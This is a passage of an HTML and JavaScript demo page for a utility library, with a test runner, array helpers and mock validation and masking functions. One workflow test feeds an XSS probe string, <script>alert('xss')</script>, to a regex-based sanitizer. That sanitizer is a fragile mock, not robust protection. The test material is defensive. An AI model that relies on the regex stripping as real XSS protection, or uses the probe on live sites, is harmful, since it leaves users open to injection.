                    <select id="logLevel" onchange="filterLogs()">
                        <option value="all">All Levels</option>
                        <option value="info">Info</option>
                        <option value="warn">Warning</option>
                        <option value="error">Error</option>
                        <option value="success">Success</option>
                    </select>
                </div>
                <button class="btn" onclick="generateLog('info')">Generate Info Log</button>
                <button class="btn btn-warning" onclick="generateLog('warn')">Generate Warning</button>
                <button class="btn btn-danger" onclick="generateLog('error')">Generate Error</button>
                <button class="btn btn-secondary" onclick="clearLogs()">Clear Logs</button>
                <div id="logDashboard" class="result-box" style="max-height: 500px; overflow-y: auto;">
                    <div class="log-entry info">[2025-12-20 10:00:00] INFO: Logging dashboard initialized</div>
                </div>
            </div>

            <div class="demo-section">
                <h3>Performance Events</h3>
                <button class="btn" onclick="logPerformanceEvent()">Log Performance Event</button>
                <button class="btn btn-secondary" onclick="generateMetricsReport()">Generate Metrics Report</button>
                <div id="performanceLogs" class="result-box" style="display:none;"></div>
            </div>
        </div>

        <!-- Collections Tab -->
        <div id="collections" class="tab-content">
            <h2>üì¶ Collections & Array Utilities</h2>
            
            <div class="demo-section">
                <h3>üìä Array Grouping</h3>
                <div class="form-group">
                    <label>Array Data (JSON):</label>
                    <textarea id="groupArrayInput" rows="3" placeholder='[{"name": "John", "category": "A"}, {"name": "Jane", "category": "B"}]'></textarea>
                </div>
                <div class="form-group">
                    <label>Group By Key:</label>
                    <input type="text" id="groupByKey" placeholder="category">
                </div>
                <button class="btn" onclick="groupArray()">Group Array</button>
                <div id="groupArrayResult" class="result-box" style="display:none;"></div>
            </div>

            <div class="demo-section">
                <h3>‚úÇÔ∏è Array Partitioning</h3>
                <div class="form-group">
                    <label>Array Data:</label>
                    <input type="text" id="partitionArrayInput" placeholder="1,2,3,4,5,6,7,8,9,10">
                </div>
                <div class="form-group">
                    <label>Partition Condition (e.g., >5):</label>
                    <input type="text" id="partitionCondition" placeholder=">5">
                </div>
                <button class="btn" onclick="partitionArray()">Partition Array</button>
                <div id="partitionArrayResult" class="result-box" style="display:none;"></div>
            </div>

            <div class="demo-section">
                <h3>üî§ Array Deduplication</h3>
                <div class="form-group">
                    <label>Array with Duplicates:</label>
                    <input type="text" id="dedupeArrayInput" placeholder="apple,Apple,Banana,apple,banana,Cherry">
                </div>
                <button class="btn" onclick="dedupeArray()">Remove Duplicates</button>
                <div id="dedupeArrayResult" class="result-box" style="display:none;"></div>
            </div>

            <div class="demo-section">
                <h3>üì¶ Array Chunking</h3>
                <div class="form-group">
                    <label>Array Data:</label>
                    <input type="text" id="chunkArrayInput" placeholder="1,2,3,4,5,6,7,8,9,10">
                </div>
                <div class="form-group">
                    <label>Chunk Size:</label>
                    <input type="number" id="chunkSize" value="3">
                </div>
                <button class="btn" onclick="chunkArray()">Chunk Array</button>
                <div id="chunkArrayResult" class="result-box" style="display:none;"></div>
            </div>

            <div class="demo-section">
                <h3>üîÄ Array Shuffling</h3>
                <div class="form-group">
                    <label>Array to Shuffle:</label>
                    <input type="text" id="shuffleArrayInput" placeholder="1,2,3,4,5,6,7,8,9,10">
                </div>
                <button class="btn" onclick="shuffleArray()">Shuffle Array</button>
                <div id="shuffleArrayResult" class="result-box" style="display:none;"></div>
            </div>

            <div class="demo-section">
                <h3>üéØ Array Operations</h3>
                <div class="form-group">
                    <label>Array Data:</label>
                    <input type="text" id="arrayOpsInput" placeholder="5,2,8,1,9,3,7,4,6,10">
                </div>
                <button class="btn" onclick="sortArray()">Sort</button>
                <button class="btn btn-secondary" onclick="takeElements()">Take(3)</button>
                <button class="btn btn-warning" onclick="skipElements()">Skip(3)</button>
                <div id="arrayOpsResult" class="result-box" style="display:none;"></div>
            </div>
        </div>

        <!-- String Tab -->
        <div id="string" class="tab-content">
            <h2>üßπ String Utilities</h2>
            
            <div class="demo-section">
                <h3>üßπ String Sanitization</h3>
                <div class="form-group">
                    <label>Unsafe String:</label>
                    <textarea id="sanitizeStringInput" rows="3" placeholder="Enter potentially unsafe string..."></textarea>
                </div>
                <button class="btn" onclick="sanitizeString()">Sanitize String</button>
                <div id="sanitizeStringResult" class="result-box" style="display:none;"></div>
            </div>
        </div>

        <!-- File Tab -->
        <div id="file" class="tab-content">
            <h2>üìÅ File Utilities</h2>
            
            <div class="demo-section">
                <h3>üìè File Size Formatting</h3>
                <div class="form-group">
                    <label>File Size (bytes):</label>
                    <input type="number" id="fileSizeInput" placeholder="1024">
                </div>
                <button class="btn" onclick="formatFileSize()">Format Size</button>
                <div id="fileSizeResult" class="result-box" style="display:none;"></div>
            </div>
        </div>

        <!-- Monitor Tab -->
        <div id="monitor" class="tab-content">
            <h2>üìà Performance Monitor</h2>
            
            <div class="demo-section">
                <h3>üìä Collect Performance Metrics</h3>
                <button class="btn" onclick="collectMonitorMetrics()">Collect Metrics</button>
                <div id="monitorMetricsResult" class="result-box" style="display:none;"></div>
            </div>

            <div class="demo-section">
                <h3>‚è∞ Measure Event Loop Lag</h3>
                <button class="btn" onclick="measureMonitorEventLoopLag()">Measure Lag</button>
                <div id="monitorEventLoopResult" class="result-box" style="display:none;"></div>
            </div>

            <div class="demo-section">
                <h3>üè• Get Performance Health Status</h3>
                <button class="btn" onclick="getPerformanceHealthStatus()">Check Health</button>
                <div id="healthStatusResult" class="result-box" style="display:none;"></div>
            </div>

            <div class="demo-section">
                <h3>üìà Analyze Performance Metrics</h3>
                <button class="btn" onclick="analyzePerformanceMetrics()">Analyze Metrics</button>
                <div id="analyzeMetricsResult" class="result-box" style="display:none;"></div>
            </div>
        </div>

        <!-- Testing Tab -->
        <div id="testing" class="tab-content">
            <h2>Testing & Documentation</h2>
            
            <div class="demo-section">
                <h3>Function Testing Playground</h3>
                <div class="form-group">
                    <label>Select Function to Test:</label>
                    <select id="testFunction">
                        <option value="validateEmail">Email Validation</option>
                        <option value="generateApiKey">API Key Generation</option>
                        <option value="hashPassword">Password Hashing</option>
                        <option value="sanitizeString">String Sanitization</option>
                        <option value="deepMerge">Object Deep Merge</option>
                        <option value="groupBy">Array Group By</option>
                        <option value="memoize">Function Memoization</option>
                        <option value="throttle">Function Throttling</option>
                        <option value="debounce">Function Debouncing</option>
                        <option value="formatDateTime">DateTime Formatting</option>
                        <option value="ensureProtocol">URL Protocol Handling</option>
                        <option value="createMinHeap">Min Heap Operations</option>
                        <option value="timingSafeCompare">Timing Safe Compare</option>
                        <option value="maskApiKey">API Key Masking</option>
                        <option value="buildRateLimitKey">Rate Limit Key Building</option>
                    </select>
                </div>
                <div class="form-group">
                    <label>Test Input:</label>
                    <textarea id="testInput" rows="3" placeholder="Enter test input"></textarea>
                </div>
                <div class="form-group">
                    <label>Test Parameters (JSON):</label>
                    <textarea id="testParams" rows="2" placeholder='{"iterations": 1000, "options": {}}'></textarea>
                </div>
                <button class="btn" onclick="runFunctionTest()">Run Test</button>
                <button class="btn btn-secondary" onclick="runBenchmark()">Run Benchmark</button>
                <button class="btn btn-warning" onclick="runEdgeCaseTests()">Test Edge Cases</button>
                <div id="testResult" class="result-box" style="display:none;"></div>
            </div>

            <div class="demo-section">
                <h3>Security Testing Tools</h3>
                <button class="btn" onclick="testXSSProtection()">Test XSS Protection</button>
                <button class="btn btn-warning" onclick="testInjectionProtection()">Test Injection Protection</button>
                <button class="btn btn-danger" onclick="testRateLimiting()">Test Rate Limiting</button>
                <button class="btn btn-secondary" onclick="testTimingAttacks()">Test Timing Attack Protection</button>
                <div id="securityTestResult" class="result-box" style="display:none;"></div>
            </div>

            <div class="demo-section">
                <h3>Load Testing</h3>
                <div class="grid">
                    <div class="form-group">
                        <label>Concurrent Users:</label>
                        <input type="number" id="loadUsers" value="10" min="1" max="100">
                    </div>
                    <div class="form-group">
                        <label>Requests per User:</label>
                        <input type="number" id="loadRequests" value="5" min="1" max="50">
                    </div>
                </div>
                <button class="btn" onclick="runLoadTest()">Run Load Test</button>
                <div id="loadTestResult" class="result-box" style="display:none;"></div>
            </div>
        </div>

        <!-- Test Runner Tab -->
        <div id="test-runner" class="tab-content">
            <h2>ü§ñ Automated Test Runner</h2>
            
            <div class="demo-section">
                <h3>Test Suite Controls</h3>
                <div class="grid">
                    <div class="form-group">
                        <label>Select Test Suite:</label>
                        <select id="testSuiteSelect">
                            <option value="validation">Validation Utilities</option>
                            <option value="security">Security Utilities</option>
                            <option value="collections">Collections & Arrays</option>
                            <option value="performance">Performance Utilities</option>
                            <option value="all">Run All Suites</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>Test Configuration:</label>
                        <div class="config-options">
                            <label>
                                <input type="checkbox" id="enablePerfMonitoring" checked> Performance Monitoring
                            </label>
                            <label>
                                <input type="checkbox" id="enableAutoReports" checked> Auto Reports
                            </label>
                            <label>
                                Delay between tests (ms):
                                <input type="number" id="testDelay" value="100" min="0" max="1000" style="width: 80px;">
                            </label>
                        </div>
                    </div>
                </div>
                
                <div class="test-controls">
                    <button class="btn" onclick="runSelectedSuite()" id="runSuiteBtn">Run Selected Suite</button>
                    <button class="btn btn-secondary" onclick="runAllTestSuites()" id="runAllBtn">Run All Tests</button>
                    <button class="btn btn-warning" onclick="stopTestRunner()" id="stopBtn">Stop Tests</button>
                    <button class="btn btn-danger" onclick="clearTestResults()">Clear Results</button>
                </div>

                <div class="progress-container">
                    <div class="progress-label" id="testRunnerStatus">Ready to run tests</div>
                    <div class="progress-bar">
                        <div class="progress-fill" id="testRunnerProgress" style="width: 0%"></div>
                    </div>
                </div>
            </div>

            <div class="demo-section">
                <h3>Test Results</h3>
                <div id="testRunnerReport" class="result-box" style="display: none; max-height: 500px; overflow-y: auto;"></div>
            </div>

            <div class="demo-section">
                <h3>Quick Test Actions</h3>
                <div class="grid">
                    <div class="card">
                        <h4>Validation Tests</h4>
                        <button class="btn" onclick="runQuickValidation()">Quick Validation Test</button>
                        <button class="btn btn-secondary" onclick="runEmailValidationSuite()">Email Validation Suite</button>
                    </div>
                    
                    <div class="card">
                        <h4>Security Tests</h4>
                        <button class="btn" onclick="runSecurityScan()">Security Scan</button>
                        <button class="btn btn-secondary" onclick="runXssTestSuite()">XSS Protection Test</button>
                    </div>
                    
                    <div class="card">
                        <h4>Performance Tests</h4>
                        <button class="btn" onclick="runPerformanceBenchmark()">Performance Benchmark</button>
                        <button class="btn btn-secondary" onclick="runMemoryLeakTest()">Memory Leak Test</button>
                    </div>
                    
                    <div class="card">
                        <h4>Integration Tests</h4>
                        <button class="btn" onclick="runWorkflowTests()">Workflow Tests</button>
                        <button class="btn btn-secondary" onclick="runEdgeCaseTests()">Edge Cases</button>
                    </div>
                </div>
            </div>

            <div class="demo-section">
                <h3>Test History & Analytics</h3>
                <div class="test-analytics">
                    <div class="metric">
                        <div class="metric-value" id="totalTestsRun">0</div>
                        <div class="metric-label">Total Tests Run</div>
                    </div>
                    <div class="metric">
                        <div class="metric-value" id="passRate">0%</div>
                        <div class="metric-label">Pass Rate</div>
                    </div>
                    <div class="metric">
                        <div class="metric-value" id="avgTestTime">0ms</div>
                        <div class="metric-label">Avg Test Time</div>
                    </div>
                    <div class="metric">
                        <div class="metric-value" id="testHistory">0</div>
                        <div class="metric-label">Test Sessions</div>
                    </div>
                </div>
                
                <button class="btn" onclick="exportTestHistory()">Export History</button>
                <button class="btn btn-secondary" onclick="clearTestHistory()">Clear History</button>
            </div>
        </div>
    </div>

    <script src="demo-test-runner.js"></script>
    <script>
        // Test Runner Management
        let testRunner = null;
        let testHistory = [];
        let totalTestsRunCount = 0;

        // Initialize Test Runner
        function initializeTestRunner() {
            if (window.DemoTestRunner) {
                testRunner = new window.DemoTestRunner();
                
                // Configure test runner
                testRunner.configure({
                    delayBetweenTests: parseInt(document.getElementById('testDelay')?.value || 100),
                    enablePerformanceMonitoring: document.getElementById('enablePerfMonitoring')?.checked !== false,
                    generateReports: document.getElementById('enableAutoReports')?.checked !== false
                });

                console.log('Test Runner initialized');
            }
        }

        // Test Runner Control Functions
        async function runSelectedSuite() {
            if (!testRunner) {
                initializeTestRunner();
            }

            const suiteSelect = document.getElementById('testSuiteSelect');
            const suiteName = suiteSelect ? suiteSelect.value : 'validation';
            const runBtn = document.getElementById('runSuiteBtn');
            if (!runBtn) return;
            
            if (suiteName === 'all') {
                await runAllTestSuites();
                return;
            }

            runBtn.disabled = true;
            runBtn.textContent = 'Running...';
            
            try {
                const result = await testRunner.runSuite(suiteName);
                updateTestAnalytics(result);
                addToHistory(`Suite: ${suiteName}`, result);
            } catch (error) {
                showNotification(`Error running suite: ${error.message}`, 'error');
            } finally {
                runBtn.disabled = false;
                runBtn.textContent = 'Run Selected Suite';
            }
        }

        async function runAllTestSuites() {
            if (!testRunner) {
                initializeTestRunner();
            }

            const runAllBtn = document.getElementById('runAllBtn');
            if (!runAllBtn) return;
            runAllBtn.disabled = true;
            runAllBtn.textContent = 'Running...';

            try {
                const result = await testRunner.runAllSuites();
                updateTestAnalytics(result);
                addToHistory('All Suites', result);
            } catch (error) {
                showNotification(`Error running all suites: ${error.message}`, 'error');
            } finally {
                runAllBtn.disabled = false;
                runAllBtn.textContent = 'Run All Tests';
            }
        }

        function stopTestRunner() {
            if (testRunner) {
                testRunner.isRunning = false;
                showNotification('Test runner stopped', 'warning');
            }
        }

        function clearTestResults() {
            if (testRunner) {
                testRunner.clearResults();
            }
            
            const reportContainer = document.getElementById('testRunnerReport');
            if (reportContainer) {
                reportContainer.innerHTML = '';
                reportContainer.style.display = 'none';
            }
            
            // Reset progress
            const progressBar = document.getElementById('testRunnerProgress');
            const statusElement = document.getElementById('testRunnerStatus');
            if (progressBar) progressBar.style.width = '0%';
            if (statusElement) statusElement.textContent = 'Ready to run tests';
        }

        // Quick Test Functions
        async function runQuickValidation() {
            if (!testRunner) initializeTestRunner();
            
            showNotification('Running quick validation tests...', 'info');
            const result = await testRunner.runSuite('validation');
            updateTestAnalytics(result);
            addToHistory('Quick Validation', result);
        }

        async function runEmailValidationSuite() {
            if (!testRunner) initializeTestRunner();
            
            showNotification('Running email validation tests...', 'info');
            const result = await testRunner.runSuite('validation');
            updateTestAnalytics(result);
            addToHistory('Email Validation Suite', result);
        }

        async function runSecurityScan() {
            if (!testRunner) initializeTestRunner();
            
            showNotification('Running security scan...', 'info');
            const result = await testRunner.runSuite('security');
            updateTestAnalytics(result);
            addToHistory('Security Scan', result);
        }

        async function runXssTestSuite() {
            if (!testRunner) initializeTestRunner();
            
            showNotification('Running XSS protection tests...', 'info');
            const result = await testRunner.runSuite('security');
            updateTestAnalytics(result);
            addToHistory('XSS Protection Test', result);
        }

        async function runPerformanceBenchmark() {
            if (!testRunner) initializeTestRunner();
            
            showNotification('Running performance benchmarks...', 'info');
            const result = await testRunner.runSuite('performance');
            updateTestAnalytics(result);
            addToHistory('Performance Benchmark', result);
        }

        async function runMemoryLeakTest() {
            if (!testRunner) initializeTestRunner();
            
            showNotification('Running memory leak test...', 'info');
            
            // Simple memory leak test
            const initialMemory = performance.memory ? performance.memory.usedJSHeapSize : 0;
            const objects = [];
            
            for (let i = 0; i < 10000; i++) {
                objects.push({ data: new Array(1000).fill(0), id: i });
            }
            
            const finalMemory = performance.memory ? performance.memory.usedJSHeapSize : 0;
            const memoryIncrease = finalMemory - initialMemory;
            
            const result = {
                testName: 'Memory Leak Test',
                memoryIncrease: memoryIncrease,
                objectsCreated: objects.length,
                passed: memoryIncrease < 50000000, // 50MB threshold
                timestamp: new Date().toISOString()
            };
            
            updateTestAnalytics({ summary: result });
            addToHistory('Memory Leak Test', result);
            
            showNotification(`Memory test completed. Increase: ${(memoryIncrease / 1024 / 1024).toFixed(2)} MB`, 'info');
        }

        async function runWorkflowTests() {
            if (!testRunner) initializeTestRunner();
            
            showNotification('Running workflow integration tests...', 'info');
            
            // Test workflow scenarios
            const workflowTests = [
                {
                    name: 'Input Validation Workflow',
                    test: () => {
                        const email = 'test@example.com';
                        const password = 'SecurePass123!';
                        const apiKey = 'sk-1234567890abcdef';
                        
                        const emailResult = utils.validateEmailFormat(email);
                        const passwordResult = utils.validatePasswordStrength(password);
                        const apiKeyResult = utils.validateApiKeyFormat(apiKey);
                        
                        return {
                            email: emailResult.isValid,
                            password: passwordResult.strength >= 3,
                            apiKey: apiKeyResult.isValid,
                            allValid: emailResult.isValid && passwordResult.strength >= 3 && apiKeyResult.isValid
                        };
                    }
                },
                {
                    name: 'Security Workflow',
                    test: () => {
                        const input = '<script>alert("xss")</script>';
                        const apiKey = 'sk-sensitive1234567890abcdef';
                        
                        const sanitized = utils.sanitizeInput(input);
                        const masked = utils.maskApiKey(apiKey);
                        
                        return {
                            sanitized: sanitized.includes('<script>') === false,
                            masked: masked.includes('*'),
                            allSecure: !sanitized.includes('<script>') && masked.includes('*')
                        };
                    }
                }
            ];
            
            const results = [];
            let passedTests = 0;
            
            for (const workflowTest of workflowTests) {
                try {
                    const result = workflowTest.test();
                    results.push({
                        name: workflowTest.name,
                        result: result,
                        passed: result.allValid !== undefined ? result.allValid : result.allSecure
                    });
                    
                    if (result.allValid !== undefined ? result.allValid : result.allSecure) {
                        passedTests++;
                    }
                } catch (error) {
                    results.push({
                        name: workflowTest.name,
                        error: error.message,
                        passed: false
                    });
                }
            }
            
            const workflowResult = {
                testName: 'Workflow Integration Tests',
                totalTests: workflowTests.length,
                passedTests: passedTests,
                passRate: (passedTests / workflowTests.length * 100).toFixed(1) + '%',
                results: results,
                timestamp: new Date().toISOString()
            };
            
            updateTestAnalytics({ summary: workflowResult });
            addToHistory('Workflow Tests', workflowResult);
            
            showNotification(`Workflow tests completed. Pass rate: ${workflowResult.passRate}`, 'info');
        }

        async function runEdgeCaseTests() {
            if (!testRunner) initializeTestRunner();
            
            showNotification('Running edge case tests...', 'info');
            
            const edgeCases = [
                { input: null, type: 'null' },
                { input: undefined, type: 'undefined' },
                { input: '', type: 'empty string' },
                { input: 0, type: 'zero' },
                { input: -1, type: 'negative' },
                { input: Number.MAX_SAFE_INTEGER, type: 'max integer' },
                { input: Number.MIN_SAFE_INTEGER, type: 'min integer' },
                { input: ' ', type: 'whitespace' },
                { input: [], type: 'empty array' },
                { input: {}, type: 'empty object' }
            ];
            
            const results = [];
            let passedCases = 0;
            
            for (const edgeCase of edgeCases) {
                try {
                    // Test with validation functions
                    const validationResult = utils.validateEmailFormat(edgeCase.input);
                    const sanitizedResult = utils.sanitizeInput(edgeCase.input);
                    
                    const caseResult = {
                        type: edgeCase.type,
                        input: edgeCase.input,
                        validation: validationResult,
                        sanitization: sanitizedResult,
                        passed: true // Edge cases shouldn't crash
                    };
                    
                    results.push(caseResult);
                    passedCases++;
                } catch (error) {
                    results.push({
                        type: edgeCase.type,
                        input: edgeCase.input,
                        error: error.message,
                        passed: false
                    });
                }
            }
            
            const edgeCaseResult = {
                testName: 'Edge Case Tests',
                totalCases: edgeCases.length,
                passedCases: passedCases,
                passRate: (passedCases / edgeCases.length * 100).toFixed(1) + '%',
                results: results,
                timestamp: new Date().toISOString()
            };
            
            updateTestAnalytics({ summary: edgeCaseResult });
            addToHistory('Edge Cases', edgeCaseResult);
            
            showNotification(`Edge case tests completed. Pass rate: ${edgeCaseResult.passRate}`, 'info');
        }

        // Analytics Functions
        function updateTestAnalytics(result) {
            const summary = result.summary;
            if (!summary) return;

            // Update total tests
            totalTestsRunCount += summary.totalTests || summary.totalTests || 0;
            document.getElementById('totalTestsRun').textContent = totalTestsRunCount;

            // Update pass rate
            const totalPasses = summary.passed || summary.passedTests || 0;
            const totalFails = summary.failed || summary.failedTests || 0;
            const totalErrors = summary.errors || summary.totalErrors || 0;
            const totalCompleted = totalPasses + totalFails + totalErrors;
            
            const passRate = totalCompleted > 0 ? (totalPasses / totalCompleted * 100).toFixed(1) : 0;
            document.getElementById('passRate').textContent = passRate + '%';

            // Update average test time
            const avgTime = summary.duration || summary.totalDuration || 0;
            const avgTestTime = totalCompleted > 0 ? (avgTime / totalCompleted).toFixed(0) : 0;
            document.getElementById('avgTestTime').textContent = avgTestTime + 'ms';

            // Update test history count
            document.getElementById('testHistory').textContent = testHistory.length;
        }

        function addToHistory(testName, result) {
            testHistory.push({
                testName,
                timestamp: new Date().toISOString(),
                result,
                summary: result.summary
            });
            
            // Keep only last 50 test sessions
            if (testHistory.length > 50) {
                testHistory = testHistory.slice(-50);
            }
            
            document.getElementById('testHistory').textContent = testHistory.length;
        }

        function exportTestHistory() {
            if (testHistory.length === 0) {
                showNotification('No test history to export', 'warning');
                return;
            }

            const exportData = {
                exportTimestamp: new Date().toISOString(),
                totalSessions: testHistory.length,
                totalTests: totalTestsRunCount,
                history: testHistory
            };

            const blob = new Blob([JSON.stringify(exportData, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'test-history.json';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);

            showNotification('Test history exported', 'success');
        }

        function clearTestHistory() {
            testHistory = [];
            totalTestsRunCount = 0;
            
            document.getElementById('totalTestsRun').textContent = '0';
            document.getElementById('passRate').textContent = '0%';
            document.getElementById('avgTestTime').textContent = '0ms';
            document.getElementById('testHistory').textContent = '0';
            
            showNotification('Test history cleared', 'info');
        }

        // Initialize demo with current date/time
        document.addEventListener('DOMContentLoaded', () => {
            const now = new Date();
            const localDateTime = new Date(now.getTime() - now.getTimezoneOffset() * 60000)
                .toISOString()
                .slice(0, 16);
            
            const dateInputs = document.querySelectorAll('input[type="datetime-local"], input[type="date"]');
            if (dateInputs) {
                dateInputs.forEach(input => {
                    if (input && !input.value) {
                        input.type === 'datetime-local' ? input.value = localDateTime : input.value = localDateTime.split('T')[0];
                    }
                });
            }

            // Initialize test runner
            initializeTestRunner();
        });

        // Utility Functions
        function showNotification(message, type = 'info') {
            // Create a simple notification (could be enhanced with a toast library)
            console.log(`[${type.toUpperCase()}] ${message}`);
        }

        function displayResult(elementId, result, type = 'info') {
            const element = document.getElementById(elementId);
            if (element) {
                element.className = `result-box ${type}`;
                element.textContent = typeof result === 'object' ? JSON.stringify(result, null, 2) : result;
                element.style.display = 'block';
            }
        }

        // Tab switching functionality
        function switchTab(tabName) {
            // Hide all tabs
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Remove active class from all nav tabs
            document.querySelectorAll('.nav-tab').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Show selected tab
            document.getElementById(tabName).classList.add('active');
            
            // Add active class to clicked nav tab
            event.target.classList.add('active');
        }

        // Mock implementations of utility functions (in real scenario, these would be imported)
        const utils = {
            // Validation utilities
            validateEmailFormat: (email) => {
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                return {
                    isValid: emailRegex.test(email),
                    errors: emailRegex.test(email) ? [] : ['Invalid email format']
                };
            },
            
            validatePasswordStrength: (password) => {
                const checks = {
                    length: password.length >= 8,
                    uppercase: /[A-Z]/.test(password),
                    lowercase: /[a-z]/.test(password),
                    numbers: /\d/.test(password),
                    special: /[!@#$%^&*(),.?":{}|<>]/.test(password)
                };
                
                const strength = Object.values(checks).filter(Boolean).length;
                
                return {
                    strength,
                    score: strength / 5,
                    checks,
                    suggestions: strength < 3 ? ['Consider adding more character types'] : []
                };
            },
            
            sanitizeInput: (input) => {
                return input
                    .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
                    .replace(/<[^>]*>/g, '')
                    .trim();
            },
            
            // Security utilities
            maskApiKey: (apiKey) => {
                if (apiKey.length <= 8) return '*'.repeat(apiKey.length);
                return apiKey.substring(0, 4) + '*'.repeat(apiKey.length - 8) + apiKey.substring(apiKey.length - 4);
            },
            
            // Collections utilities
            groupBy: (array, key) => {
                return array.reduce((groups, item) => {
                    const group = item[key];
                    groups[group] = groups[group] || [];
                    groups[group].push(item);
                    return groups;
                }, {});
            },
            
            partition: (array, condition) => {
                const truthy = [];
                const falsy = [];
                
                array.forEach(item => {
                    if (condition(item)) {
                        truthy.push(item);
                    } else {
                        falsy.push(item);
                    }
                });
                
                return [truthy, falsy];
            },
            
            unique: (array) => [...new Set(array)],
            
            chunk: (array, size) => {
                const chunks = [];
                for (let i = 0; i < array.length; i += size) {
                    chunks.push(array.slice(i, i + size));
                }
                return chunks;
            },
            
            shuffle: (array) => {
                const shuffled = [...array];
                for (let i = shuffled.length - 1; i > 0; i--) {
                    const j = Math.floor(Math.random() * (i + 1));
                    [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
                }
                return shuffled;
            },
            
            sortBy: (array, key) => {
                return [...array].sort((a, b) => {
                    if (a[key] < b[key]) return -1;
                    if (a[key] > b[key]) return 1;
                    return 0;
                });
            },
            
            take: (array, n) => array.slice(0, n),
            
            skip: (array, n) => array.slice(n),
            
            // Performance utilities
            memoize: (fn) => {
                const cache = new Map();
                return (...args) => {
                    const key = JSON.stringify(args);
                    if (cache.has(key)) {
                        return cache.get(key);
                    }
                    const result = fn(...args);
                    cache.set(key, result);
                    return result;
                };
            },
            
            throttle: (fn, delay) => {
                let lastCall = 0;
                return (...args) => {
                    const now = Date.now();
                    if (now - lastCall >= delay) {
                        lastCall = now;
                        return fn(...args);
                    }
                };
            },
            
            debounce: (fn, delay) => {
                let timeoutId;
                return (...args) => {
                    clearTimeout(timeoutId);
                    timeoutId = setTimeout(() => fn(...args), delay);
                };
            },
            
            // DateTime utilities
            formatDateTime: (date) => {
                return new Intl.DateTimeFormat('en-US', {
                    year: 'numeric',
                    month: 'long',
                    day: 'numeric',
                    hour: '2-digit',
                    minute: '2-digit',
                    second: '2-digit'
                }).format(new Date(date));
            },
            
            formatDate: (date) => {
                return new Intl.DateTimeFormat('en-US', {
                    year: 'numeric',
                    month: 'long',
                    day: 'numeric'
                }).format(new Date(date));
            },
            
            formatDuration: (ms) => {
                const seconds = Math.floor(ms / 1000);
                const minutes = Math.floor(seconds / 60);
                const hours = Math.floor(minutes / 60);
                const days = Math.floor(hours / 24);
                
                if (days > 0) return `${days}d ${hours % 24}h ${minutes % 60}m`;
                if (hours > 0) return `${hours}h ${minutes % 60}m`;
                if (minutes > 0) return `${minutes}m ${seconds % 60}s`;
                return `${seconds}s`;
            },
            
            addDays: (date, days) => {
                const result = new Date(date);
                result.setDate(result.getDate() + days);
                return result;
            },
            
            formatRelativeTime: (date) => {
                const now = new Date();
                const target = new Date(date);
                const diffMs = target - now;
                const diffDays = Math.floor(diffMs / (1000 * 60 * 60 * 24));
                
                if (diffDays === 0) return 'today';
                if (diffDays === 1) return 'tomorrow';
                if (diffDays === -1) return 'yesterday';
                if (diffDays > 0) return `in ${diffDays} days`;
                return `${Math.abs(diffDays)} days ago`;
            },
            
            // URL utilities
            ensureProtocol: (url, protocol = 'https') => {
                if (!/^https?:\/\//i.test(url)) {
                    return `${protocol}://${url}`;
                }
                return url;
            },
            
            normalizeUrlOrigin: (url) => {
                try {
                    const parsed = new URL(url);
                    return `${parsed.protocol}//${parsed.host}`;
                } catch {
                    return url;
                }
            },
            
            stripProtocol: (url) => {
                return url.replace(/^https?:\/\//i, '');
            },
            
            parseUrlParts: (url) => {
                try {
                    const parsed = new URL(url);
                    return {
                        protocol: parsed.protocol,
                        hostname: parsed.hostname,
                        port: parsed.port,
                        pathname: parsed.pathname,
                        search: parsed.search,
                        hash: parsed.hash,
                        origin: parsed.origin
                    };
                } catch (e) {
                    return { error: e.message };
                }
            },
            
            // HTTP utilities
            createJsonHeaders: () => ({
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            }),
            
            createBasicAuth: (username, password) => {
                const credentials = btoa(`${username}:${password}`);
                return {
                    'Authorization': `Basic ${credentials}`
                };
            },
            
            getContextualTimeout: (requestType) => {
                const timeouts = {
                    fast: 1000,
                    normal: 5000,
                    slow: 30000,
                    batch: 120000
                };
                return timeouts[requestType] || timeouts.normal;
            },
            
            // File utilities
            formatFileSize: (bytes) => {
                const units = ['B', 'KB', 'MB', 'GB', 'TB'];
                let size = bytes;
                let unitIndex = 0;
                
                while (size >= 1024 && unitIndex < units.length - 1) {
                    size /= 1024;
                    unitIndex++;
                }
                
                return `${size.toFixed(1)} ${units[unitIndex]}`;
            }
        };

        // Overview Tab Functions
        function quickTestFunction() {
            const input = document.getElementById('quickTest').value;
            const result = {
                original: input,
                sanitized: utils.sanitizeInput(input),
                length: input.length,
                words: input.split(' ').length
            };
            displayResult('quickTestResult', result, 'success');
            showNotification('Quick test completed!', 'success');
        }

        function validateShowcaseEmail() {
            const email = document.getElementById('showcaseEmail').value;
            const result = utils.validateEmailFormat(email);
            displayResult('emailResult', result, result.isValid ? 'success' : 'error');
        }

        function maskShowcaseKey() {
            const apiKey = document.getElementById('showcaseApiKey').value;
            const masked = utils.maskApiKey(apiKey);
            displayResult('apiKeyResult', { original: apiKey, masked: masked }, 'info');
        }

        function runPerformanceDemo() {
            const start = performance.now();
            
            // Simulate some work
            let result = 0;
            for (let i = 0; i < 1000000; i++) {
                result += Math.random();
            }
            
            const end = performance.now();
            const duration = end - start;
            
            displayResult('perfResult', {
                operation: 'Mathematical computation',
                iterations: 1000000,
                duration: `${duration.toFixed(2)}ms`,
                result: result.toFixed(2)
            }, 'success');
        }

        // Validation functions
        function validateEmail() {
            const email = document.getElementById('emailInput').value;
            const feedback = document.getElementById('emailFeedback');
            
            if (email === '') {
                feedback.innerHTML = '';
                return;
            }
            
            const result = utils.validateEmailFormat(email);
            if (result.isValid) {
                feedback.innerHTML = '<div class="validation-feedback valid">‚úì Valid email address</div>';
            } else {
                feedback.innerHTML = '<div class="validation-feedback invalid">‚úó Invalid email format</div>';
            }
        }

        function checkPasswordStrength() {
            const password = document.getElementById('passwordInput').value;
            const strengthBar = document.getElementById('passwordStrength');
            const feedback = document.getElementById('passwordFeedback');
            
            if (password === '') {
                strengthBar.className = 'password-strength';
                feedback.innerHTML = '';
